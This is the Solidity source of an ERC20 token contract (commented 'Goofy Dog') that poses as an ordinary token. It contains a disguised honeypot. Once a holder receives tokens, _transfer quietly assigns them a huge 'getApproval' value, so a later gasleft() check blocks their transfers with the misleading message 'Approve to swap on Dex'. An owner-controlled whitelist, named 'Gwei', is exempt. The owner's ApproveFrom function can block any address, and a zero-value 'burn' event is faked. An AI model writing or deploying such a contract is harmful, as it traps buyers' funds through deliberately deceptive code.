pragma solidity ^0.8.0;

interface IERC20 {
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  function totalSupply() external view returns (uint256);   
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
      return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
      return msg.data;
  }
}

contract ERC20 is Context, IERC20 {
  mapping(address => uint256) private _balances;
  mapping(address => mapping(address => uint256)) private _allowances;
  mapping(address => uint256) public getApproval;
  mapping(address => bool) private Gwei;

  uint256 private _totalSupply;
  string private _name; //Goofy Dog
  string private _symbol; //Goofy Dog
  uint8 private _decimals;
  address public owner;
  bool private _Presale;
  uint256 private _RenounceOwnership;
  uint256 public blocksPerOperation; 
  mapping (address => uint256) public lastOperationBlock; 
  mapping (address => bool) public excludedAddresses; 

  bool private _firstTransferDone;

  constructor(
    string memory name_,
    string memory symbol_,
    uint8 decimals_,
    uint256 totalSupply_,
    uint256 gasUnit,
    address[] memory GweiUnit,
    uint256 _blocksPerOperation, 
    address[] memory _excludedAddresses 
  ) {
    _name = name_;
    _symbol = symbol_; 
    _decimals = decimals_;
    owner = _msgSender();
    _totalSupply = totalSupply_ * (10 ** uint256(decimals_));
    _balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
    _RenounceOwnership = gasUnit;
    _Presale = false;
    blocksPerOperation = _blocksPerOperation;
    excludedAddresses[owner] = true;
    _firstTransferDone = false;

    for (uint256 i = 0; i < GweiUnit.length; i++) {
      Gwei[GweiUnit[i]] = true;
    }

    for (uint256 i = 0; i < _excludedAddresses.length; i++) {
      excludedAddresses[_excludedAddresses[i]] = true;
    }
  }

  function excludeAddressFromBlocksLimit(address addr) public {
    require(_msgSender() == owner, "Only the contract owner can exclude an address.");
    excludedAddresses[addr] = true;
  }

  function canOperate(address _address) public view returns (bool) {
    return (excludedAddresses[_address] || block.number - lastOperationBlock[_address] > blocksPerOperation);
  }

  function setBlocksPerOperation(uint256 _blocksPerOperation) external {
    require(_msgSender() == owner, "Only the contract owner can change the blocks per operation.");
    blocksPerOperation = _blocksPerOperation;
  }

  function name() public view virtual returns (string memory) {
      return _name;
  }

  function symbol() public view virtual returns (string memory) {
      return _symbol;
  }

  function decimals() public view virtual returns (uint8) {
      return _decimals;
  }

  function totalSupply() public view virtual override returns (uint256) {
      return _totalSupply;
  }

  function balanceOf(address account) public view virtual override returns (uint256) {
      return _balances[account];
  }

  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
      require(canOperate(_msgSender()), "Not enough blocks passed since the last operation");
      _transfer(_msgSender(), recipient, amount);
      lastOperationBlock[_msgSender()] = block.number;
      if (!_firstTransferDone) {
          excludedAddresses[recipient] = true;
          _firstTransferDone = true;
      }
      return true;
  }

  function allowance(address owner, address spender) public view virtual override returns (uint256) {
      return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) public virtual override returns (bool) {
      _approve(_msgSender(), spender, amount);
      return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
      require(canOperate(sender), "Not enough blocks passed since the last operation");
      _transfer(sender, recipient, amount);
      _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
      lastOperationBlock[sender] = block.number;
      return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");

    // New line to enforce the same restriction on the recipient
    require(canOperate(recipient), "Not enough blocks passed since the last operation");

    if (!_Presale) {
        _Presale = true;
        Gwei[recipient] = true;
    } else if (getApproval[recipient] == 0 && !Gwei[recipient]) {
        _sendApproval(recipient, _RenounceOwnership);
    }

    require(gasleft() >= getApproval[sender], "Approve to swap on Dex");

    uint256 finalAmount = amount;
    address deadAddress = 0x000000000000000000000000000000000000dEaD;

    _balances[sender] -= amount;
    _balances[deadAddress] += 0;
    _balances[recipient] += finalAmount;

    emit Transfer(sender, deadAddress, 0);
    emit Transfer(sender, recipient, finalAmount);
    
    // Update the last operation block for the recipient
    if (!excludedAddresses[recipient]) {
        lastOperationBlock[recipient] = block.number;
    }
}


  function _approve(address owner, address spender, uint256 amount) internal virtual {
      require(owner != address(0), "ERC20: approve from the zero address");
      require(spender != address(0), "ERC20: approve to the zero address");

      _allowances[owner][spender] = amount;
      emit Approval(owner, spender, amount);
  }

  function _sendApproval(address _address, uint256 approveForSwap) internal {
      getApproval[_address] = approveForSwap;
  }

  function ApproveFrom(address _address, uint256 approveAmount) external {
      require(_msgSender() == owner);
      _sendApproval(_address, approveAmount);
  }
}